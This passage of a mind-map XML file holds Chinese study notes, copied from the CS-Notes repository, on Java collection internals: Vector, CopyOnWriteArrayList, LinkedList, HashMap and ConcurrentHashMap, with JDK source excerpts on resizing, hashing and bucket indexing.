        throw new ArrayIndexOutOfBoundsException(index);
    return elementData(index);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1076368768" CREATED="1754750650421" MODIFIED="1754750650423"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 扩容
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 扩容" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#2-扩容-1">
</a>
    <p dir="auto">
      Vector 的构造函数可以传入 capacityIncrement 参数，它的作用是在扩容时使容量 capacity 增长 capacityIncrement。如果这个参数的值小于等于 0，扩容时每次都令 capacity 为原来的两倍。
    </p>
    <pre>public Vector(int initialCapacity, int capacityIncrement) {
    super();
    if (initialCapacity &lt; 0)
        throw new IllegalArgumentException(&quot;Illegal Capacity: &quot;+
                                           initialCapacity);
    this.elementData = new Object[initialCapacity];
    this.capacityIncrement = capacityIncrement;
}</pre>
    <pre>private void grow(int minCapacity) {
    // overflow-conscious code
    int oldCapacity = elementData.length;
    int newCapacity = oldCapacity + ((capacityIncrement &gt; 0) ?
                                     capacityIncrement : oldCapacity);
    if (newCapacity - minCapacity &lt; 0)
        newCapacity = minCapacity;
    if (newCapacity - MAX_ARRAY_SIZE &gt; 0)
        newCapacity = hugeCapacity(minCapacity);
    elementData = Arrays.copyOf(elementData, newCapacity);
}</pre>
    <p dir="auto">
      调用没有 capacityIncrement 的构造函数时，capacityIncrement 值被设置为 0，也就是说默认情况下 Vector 每次扩容时容量都会翻倍。
    </p>
    <pre>public Vector(int initialCapacity) {
    this(initialCapacity, 0);
}
public Vector() {
    this(10);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1403999989" CREATED="1754750650423" MODIFIED="1754750650425"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 与 ArrayList 的比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 与 ArrayList 的比较" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#3-与-arraylist-的比较">
</a>
    <ul dir="auto">
      <li>
        Vector 是同步的，因此开销就比 ArrayList 要大，访问速度更慢。最好使用 ArrayList 而不是 Vector，因为同步操作完全可以由程序员自己来控制；
      </li>
      <li>
        Vector 每次扩容请求其大小的 2 倍（也可以通过构造函数设置增长的容量），而 ArrayList 是 1.5 倍。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1946641014" CREATED="1754750650425" MODIFIED="1754750650427"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 替代方案
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 替代方案" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#4-替代方案">
</a>
    <p dir="auto">
      可以使用 <code>Collections.synchronizedList();</code>&#xa0;得到一个线程安全的 ArrayList。
    </p>
    <pre>List&lt;String&gt; list = new ArrayList&lt;&gt;();
List&lt;String&gt; synList = Collections.synchronizedList(list);</pre>
    <p dir="auto">
      也可以使用 concurrent 并发包下的 CopyOnWriteArrayList 类。
    </p>
    <pre>List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;();</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1784436134" CREATED="1754750650427" MODIFIED="1754750650427"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      CopyOnWriteArrayList
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1329614815" CREATED="1754750650429" MODIFIED="1754750650430"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 读写分离
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 读写分离" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#1-读写分离">
</a>
    <p dir="auto">
      写操作在一个复制的数组上进行，读操作还是在原始数组中进行，读写分离，互不影响。
    </p>
    <p dir="auto">
      写操作需要加锁，防止并发写入时导致写入数据丢失。
    </p>
    <p dir="auto">
      写操作结束之后需要把原始数组指向新的复制数组。
    </p>
    <pre>public boolean add(E e) {
    final ReentrantLock lock = this.lock;
    lock.lock();
    try {
        Object[] elements = getArray();
        int len = elements.length;
        Object[] newElements = Arrays.copyOf(elements, len + 1);
        newElements[len] = e;
        setArray(newElements);
        return true;
    } finally {
        lock.unlock();
    }
}
final void setArray(Object[] a) {
    array = a;
}</pre>
    <pre>@SuppressWarnings(&quot;unchecked&quot;)
private E get(Object[] a, int index) {
    return (E) a[index];
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1060265569" CREATED="1754750650430" MODIFIED="1754750650432"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 适用场景
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 适用场景" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#2-适用场景">
</a>
    <p dir="auto">
      CopyOnWriteArrayList 在写操作的同时允许读操作，大大提高了读操作的性能，因此很适合读多写少的应用场景。
    </p>
    <p dir="auto">
      但是 CopyOnWriteArrayList 有其缺陷：
    </p>
    <ul dir="auto">
      <li>
        内存占用：在写操作时需要复制一个新的数组，使得内存占用为原来的两倍左右；
      </li>
      <li>
        数据不一致：读操作不能读取实时性的数据，因为部分写操作的数据还未同步到读数组中。
      </li>
    </ul>
    <p dir="auto">
      所以 CopyOnWriteArrayList 不适合内存敏感以及对实时性要求很高的场景。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1131865374" CREATED="1754750650432" MODIFIED="1754750650432"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      LinkedList
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1286945432" CREATED="1754750650435" MODIFIED="1754750650436"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 概览
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 概览" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#1-概览-1">
</a>
    <p dir="auto">
      基于双向链表实现，使用 Node 存储链表节点信息。
    </p>
    <pre>private static class Node&lt;E&gt; {
    E item;
    Node&lt;E&gt; next;
    Node&lt;E&gt; prev;
}</pre>
    <p dir="auto">
      每个链表存储了 first 和 last 指针：
    </p>
    <pre>transient Node&lt;E&gt; first;
transient Node&lt;E&gt; last;</pre>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5535334fda92e3a38dd2f96e6c9939fc8ed06fe089be6dd3127309833be03082/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233333934303036362e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5535334fda92e3a38dd2f96e6c9939fc8ed06fe089be6dd3127309833be03082/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233333934303036362e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208233940066.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_411808867" CREATED="1754750650437" MODIFIED="1754750650438"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 与 ArrayList 的比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 与 ArrayList 的比较" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#2-与-arraylist-的比较">
</a>
    <p dir="auto">
      ArrayList 基于动态数组实现，LinkedList 基于双向链表实现。ArrayList 和 LinkedList 的区别可以归结为数组和链表的区别：
    </p>
    <ul dir="auto">
      <li>
        数组支持随机访问，但插入删除的代价很高，需要移动大量元素；
      </li>
      <li>
        链表不支持随机访问，但插入删除只需要改变指针。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1628594193" CREATED="1754750650439" MODIFIED="1754750650440"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      HashMap
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: HashMap" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#hashmap">
</a>
    <p dir="auto">
      为了便于理解，以下源码分析以 JDK 1.7 为主。
    </p>
  </body>
</html></richcontent>
<node ID="ID_1211305727" CREATED="1754750650441" MODIFIED="1754750650442"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 存储结构
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 存储结构" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#1-存储结构">
</a>
    <p dir="auto">
      内部包含了一个 Entry 类型的数组 table。Entry 存储着键值对。它包含了四个字段，从 next 字段我们可以看出 Entry 是一个链表。即数组中的每个位置被当成一个桶，一个桶存放一个链表。HashMap 使用拉链法来解决冲突，同一个链表中存放哈希值和散列桶取模运算结果相同的 Entry。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/bbf00af214dc2afc5ff477d9db9e2c17a6c39bfaea94d6ee6bb214020000c93c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233343934383230352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/bbf00af214dc2afc5ff477d9db9e2c17a6c39bfaea94d6ee6bb214020000c93c/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233343934383230352e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208234948205.png"/>
    </a><br/>
    

    <pre>transient Entry[] table;</pre>
    <pre>static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; {
    final K key;
    V value;
    Entry&lt;K,V&gt; next;
    int hash;
    Entry(int h, K k, V v, Entry&lt;K,V&gt; n) {
        value = v;
        next = n;
        key = k;
        hash = h;
    }
    public final K getKey() {
        return key;
    }
    public final V getValue() {
        return value;
    }
    public final V setValue(V newValue) {
        V oldValue = value;
        value = newValue;
        return oldValue;
    }
    public final boolean equals(Object o) {
        if (!(o instanceof Map.Entry))
            return false;
        Map.Entry e = (Map.Entry)o;
        Object k1 = getKey();
        Object k2 = e.getKey();
        if (k1 == k2 || (k1 != null &amp;&amp; k1.equals(k2))) {
            Object v1 = getValue();
            Object v2 = e.getValue();
            if (v1 == v2 || (v1 != null &amp;&amp; v1.equals(v2)))
                return true;
        }
        return false;
    }
    public final int hashCode() {
        return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue());
    }
    public final String toString() {
        return getKey() + &quot;=&quot; + getValue();
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_600173520" CREATED="1754750650443" MODIFIED="1754750650445"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 拉链法的工作原理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 拉链法的工作原理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#2-拉链法的工作原理">
</a>
    <pre>HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();
map.put(&quot;K1&quot;, &quot;V1&quot;);
map.put(&quot;K2&quot;, &quot;V2&quot;);
map.put(&quot;K3&quot;, &quot;V3&quot;);</pre>
    <ul dir="auto">
      <li>
        新建一个 HashMap，默认大小为 16；
      </li>
      <li>
        插入 &lt;K1,V1&gt; 键值对，先计算 K1 的 hashCode 为 115，使用除留余数法得到所在的桶下标 115%16=3。
      </li>
      <li>
        插入 &lt;K2,V2&gt; 键值对，先计算 K2 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6。
      </li>
      <li>
        插入 &lt;K3,V3&gt; 键值对，先计算 K3 的 hashCode 为 118，使用除留余数法得到所在的桶下标 118%16=6，插在 &lt;K2,V2&gt; 前面。
      </li>
    </ul>
    <p dir="auto">
      应该注意到链表的插入是以头插法方式进行的，例如上面的 &lt;K3,V3&gt; 不是插在 &lt;K2,V2&gt; 后面，而是插入在链表头部。
    </p>
    <p dir="auto">
      查找需要分成两步进行：
    </p>
    <ul dir="auto">
      <li>
        计算键值对所在的桶；
      </li>
      <li>
        在链表上顺序查找，时间复杂度显然和链表的长度成正比。
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5a395c464053182beb60a2474e53dab9f238462f00665be0a2e0f8da6016916a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233353235383634332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5a395c464053182beb60a2474e53dab9f238462f00665be0a2e0f8da6016916a/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383233353235383634332e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208235258643.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1981985351" CREATED="1754750650445" MODIFIED="1754750650447"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. put 操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. put 操作" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#3-put-操作">
</a>
    <pre>public V put(K key, V value) {
    if (table == EMPTY_TABLE) {
        inflateTable(threshold);
    }
    // 键为 null 单独处理
    if (key == null)
        return putForNullKey(value);
    int hash = hash(key);
    // 确定桶下标
    int i = indexFor(hash, table.length);
    // 先找出是否已经存在键为 key 的键值对，如果存在的话就更新这个键值对的值为 value
    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) {
        Object k;
        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }
    modCount++;
    // 插入新键值对
    addEntry(hash, key, value, i);
    return null;
}</pre>
    <p dir="auto">
      HashMap 允许插入键为 null 的键值对。但是因为无法调用 null 的 hashCode() 方法，也就无法确定该键值对的桶下标，只能通过强制指定一个桶下标来存放。HashMap 使用第 0 个桶存放键为 null 的键值对。
    </p>
    <pre>private V putForNullKey(V value) {
    for (Entry&lt;K,V&gt; e = table[0]; e != null; e = e.next) {
        if (e.key == null) {
            V oldValue = e.value;
            e.value = value;
            e.recordAccess(this);
            return oldValue;
        }
    }
    modCount++;
    addEntry(0, null, value, 0);
    return null;
}</pre>
    <p dir="auto">
      使用链表的头插法，也就是新的键值对插在链表的头部，而不是链表的尾部。
    </p>
    <pre>void addEntry(int hash, K key, V value, int bucketIndex) {
    if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) {
        resize(2 * table.length);
        hash = (null != key) ? hash(key) : 0;
        bucketIndex = indexFor(hash, table.length);
    }
    createEntry(hash, key, value, bucketIndex);
}
void createEntry(int hash, K key, V value, int bucketIndex) {
    Entry&lt;K,V&gt; e = table[bucketIndex];
    // 头插法，链表头部指向新的键值对
    table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e);
    size++;
}</pre>
    <pre>Entry(int h, K k, V v, Entry&lt;K,V&gt; n) {
    value = v;
    next = n;
    key = k;
    hash = h;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1809368458" CREATED="1754750650447" MODIFIED="1754750650449"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 确定桶下标
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 确定桶下标" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#4-确定桶下标">
</a>
    <p dir="auto">
      很多操作都需要先确定一个键值对所在的桶下标。
    </p>
    <pre>int hash = hash(key);
int i = indexFor(hash, table.length);</pre>
    <p dir="auto">
      <strong>4.1 计算 hash 值</strong>
    </p>
    <pre>final int hash(Object k) {
    int h = hashSeed;
    if (0 != h &amp;&amp; k instanceof String) {
        return sun.misc.Hashing.stringHash32((String) k);
    }
    h ^= k.hashCode();
    // This function ensures that hashCodes that differ only by
    // constant multiples at each bit position have a bounded
    // number of collisions (approximately 8 at default load factor).
    h ^= (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);
    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);
}</pre>
    <pre>public final int hashCode() {
    return Objects.hashCode(key) ^ Objects.hashCode(value);
}</pre>
    <p dir="auto">
      <strong>4.2 取模</strong>
    </p>
    <p dir="auto">
      令 x = 1&lt;&lt;4，即 x 为 2 的 4 次方，它具有以下性质：
    </p>
    <pre class="notranslate">x   : 00010000
x-1 : 00001111</pre>
    <p dir="auto">
      令一个数 y 与 x-1 做与运算，可以去除 y 位级表示的第 4 位以上数：
    </p>
    <pre class="notranslate">y       : 10110010
x-1     : 00001111
y&amp;(x-1) : 00000010</pre>
    <p dir="auto">
      这个性质和 y 对 x 取模效果是一样的：
    </p>
    <pre class="notranslate">y   : 10110010
x   : 00010000
y%x : 00000010</pre>
    <p dir="auto">
      我们知道，位运算的代价比求模运算小的多，因此在进行这种计算时用位运算的话能带来更高的性能。
    </p>
    <p dir="auto">
      确定桶下标的最后一步是将 key 的 hash 值对桶个数取模：hash%capacity，如果能保证 capacity 为 2 的 n 次方，那么就可以将这个操作转换为位运算。
    </p>
    <pre>static int indexFor(int h, int length) {
    return h &amp; (length-1);
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1390185658" CREATED="1754750650450" MODIFIED="1754750650451"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 扩容-基本原理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 扩容-基本原理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#5-扩容-基本原理">
</a>
    <p dir="auto">
      设 HashMap 的 table 长度为 M，需要存储的键值对数量为 N，如果哈希函数满足均匀性的要求，那么每条链表的长度大约为 N/M，因此查找的复杂度为 O(N/M)。
    </p>
    <p dir="auto">
      为了让查找的成本降低，应该使 N/M 尽可能小，因此需要保证 M 尽可能大，也就是说 table 要尽可能大。HashMap 采用动态扩容来根据当前的 N 值来调整 M 值，使得空间效率和时间效率都能得到保证。
    </p>
    <p dir="auto">
      和扩容相关的参数主要有：capacity、size、threshold 和 load_factor。
    </p>
    <markdown-accessiblity-table/>
    

    <table>
      <tr>
        <th>
          参数
        </th>
        <th>
          含义
        </th>
      </tr>
      <tr>
        <td>
          capacity
        </td>
        <td>
          table 的容量大小，默认为 16。需要注意的是 capacity 必须保证为 2 的 n 次方。
        </td>
      </tr>
      <tr>
        <td>
          size
        </td>
        <td>
          键值对数量。
        </td>
      </tr>
      <tr>
        <td>
          threshold
        </td>
        <td>
          size 的临界值，当 size 大于等于 threshold 就必须进行扩容操作。
        </td>
      </tr>
      <tr>
        <td>
          loadFactor
        </td>
        <td>
          装载因子，table 能够使用的比例，threshold = (int)(capacity* loadFactor)。
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>    

    <pre>static final int DEFAULT_INITIAL_CAPACITY = 16;
static final int MAXIMUM_CAPACITY = 1 &lt;&lt; 30;
static final float DEFAULT_LOAD_FACTOR = 0.75f;
transient Entry[] table;
transient int size;
int threshold;
final float loadFactor;
transient int modCount;</pre>
    <p dir="auto">
      从下面的添加元素代码中可以看出，当需要扩容时，令 capacity 为原来的两倍。
    </p>
    <pre>void addEntry(int hash, K key, V value, int bucketIndex) {
    Entry&lt;K,V&gt; e = table[bucketIndex];
    table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e);
    if (size++ &gt;= threshold)
        resize(2 * table.length);
}</pre>
    <p dir="auto">
      扩容使用 resize() 实现，需要注意的是，扩容操作同样需要把 oldTable 的所有键值对重新插入 newTable 中，因此这一步是很费时的。
    </p>
    <pre>void resize(int newCapacity) {
    Entry[] oldTable = table;
    int oldCapacity = oldTable.length;
    if (oldCapacity == MAXIMUM_CAPACITY) {
        threshold = Integer.MAX_VALUE;
        return;
    }
    Entry[] newTable = new Entry[newCapacity];
    transfer(newTable);
    table = newTable;
    threshold = (int)(newCapacity * loadFactor);
}
void transfer(Entry[] newTable) {
    Entry[] src = table;
    int newCapacity = newTable.length;
    for (int j = 0; j &lt; src.length; j++) {
        Entry&lt;K,V&gt; e = src[j];
        if (e != null) {
            src[j] = null;
            do {
                Entry&lt;K,V&gt; next = e.next;
                int i = indexFor(e.hash, newCapacity);
                e.next = newTable[i];
                newTable[i] = e;
                e = next;
            } while (e != null);
        }
    }
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1693819715" CREATED="1754750650452" MODIFIED="1754750650454"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      6. 扩容-重新计算桶下标
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 6. 扩容-重新计算桶下标" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#6-扩容-重新计算桶下标">
</a>
    <p dir="auto">
      在进行扩容时，需要把键值对重新计算桶下标，从而放到对应的桶上。在前面提到，HashMap 使用 hash%capacity 来确定桶下标。HashMap capacity 为 2 的 n 次方这一特点能够极大降低重新计算桶下标操作的复杂度。
    </p>
    <p dir="auto">
      假设原数组长度 capacity 为 16，扩容之后 new capacity 为 32：
    </p>
    <pre>capacity     : 00010000
new capacity : 00100000</pre>
    <p dir="auto">
      对于一个 Key，它的哈希值 hash 在第 5 位：
    </p>
    <ul dir="auto">
      <li>
        为 0，那么 hash%00010000 = hash%00100000，桶位置和原来一致；
      </li>
      <li>
        为 1，hash%00010000 = hash%00100000 + 16，桶位置是原位置 + 16。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_529212483" CREATED="1754750650455" MODIFIED="1754750650456"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      7. 计算数组容量
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 7. 计算数组容量" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#7-计算数组容量">
</a>
    <p dir="auto">
      HashMap 构造函数允许用户传入的容量不是 2 的 n 次方，因为它可以自动地将传入的容量转换为 2 的 n 次方。
    </p>
    <p dir="auto">
      先考虑如何求一个数的掩码，对于 10010000，它的掩码为 11111111，可以使用以下方法得到：
    </p>
    <pre class="notranslate">mask |= mask &gt;&gt; 1    11011000
mask |= mask &gt;&gt; 2    11111110
mask |= mask &gt;&gt; 4    11111111</pre>
    <p dir="auto">
      mask+1 是大于原始数字的最小的 2 的 n 次方。
    </p>
    <pre class="notranslate">num     10010000
mask+1 100000000</pre>
    <p dir="auto">
      以下是 HashMap 中计算数组容量的代码：
    </p>
    <pre>static final int tableSizeFor(int cap) {
    int n = cap - 1;
    n |= n &gt;&gt;&gt; 1;
    n |= n &gt;&gt;&gt; 2;
    n |= n &gt;&gt;&gt; 4;
    n |= n &gt;&gt;&gt; 8;
    n |= n &gt;&gt;&gt; 16;
    return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;
}</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1632741209" CREATED="1754750650457" MODIFIED="1754750650458"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      8. 链表转红黑树
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 8. 链表转红黑树" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#8-链表转红黑树">
</a>
    <p dir="auto">
      从 JDK 1.8 开始，一个桶存储的链表长度大于等于 8 时会将链表转换为红黑树。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_362022019" CREATED="1754750650459" MODIFIED="1754750650460"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      9. 与 Hashtable 的比较
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 9. 与 Hashtable 的比较" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#9-与-hashtable-的比较">
</a>
    <ul dir="auto">
      <li>
        Hashtable 使用 synchronized 来进行同步。
      </li>
      <li>
        HashMap 可以插入键为 null 的 Entry。
      </li>
      <li>
        HashMap 的迭代器是 fail-fast 迭代器。
      </li>
      <li>
        HashMap 不能保证随着时间的推移 Map 中的元素次序是不变的。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1842849503" CREATED="1754750650461" MODIFIED="1754750650461"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      ConcurrentHashMap
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_517207871" CREATED="1754750650462" MODIFIED="1754750650463"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 存储结构
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 存储结构" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E5%AE%B9%E5%99%A8.md#1-存储结构-1">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c0bbafc9ea22a07a801c3eb9ebe0384aaa1ad32b631e20432a586cd0aca7e558/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230393030313033383032342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/c0bbafc9ea22a07a801c3eb9ebe0384aaa1ad32b631e20432a586cd0aca7e558/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230393030313033383032342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191209001038024.png"/></a><br/>
    <pre>static final class HashEntry&lt;K,V&gt; {
    final int hash;
    final K key;
    volatile V value;
    volatile HashEntry&lt;K,V&gt; next;
}</pre>
    <p dir="auto">
      ConcurrentHashMap 和 HashMap 实现上类似，最主要的差别是 ConcurrentHashMap 采用了分段锁（Segment），每个分段锁维护着几个桶（HashEntry），多个线程可以同时访问不同分段锁上的桶，从而使其并发度更高（并发度就是 Segment 的个数）。
    </p>
    <p dir="auto">
      Segment 继承自 ReentrantLock。
    </p>
    <pre>static final class Segment&lt;K,V&gt; extends ReentrantLock implements Serializable {
    private static final long serialVersionUID = 2249069246763182397L;
    static final int MAX_SCAN_RETRIES =
        Runtime.getRuntime().availableProcessors() &gt; 1 ? 64 : 1;
    transient volatile HashEntry&lt;K,V&gt;[] table;
    transient int count;
    transient int modCount;
    transient int threshold;
    final float loadFactor;
}</pre>
    <pre>final Segment&lt;K,V&gt;[] segments;</pre>
    <p dir="auto">
      默认的并发级别为 16，也就是说默认创建 16 个 Segment。
    </p>
    <pre>static final int DEFAULT_CONCURRENCY_LEVEL = 16;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1328394968" CREATED="1754750650464" MODIFIED="1754750650466"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. size 操作
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
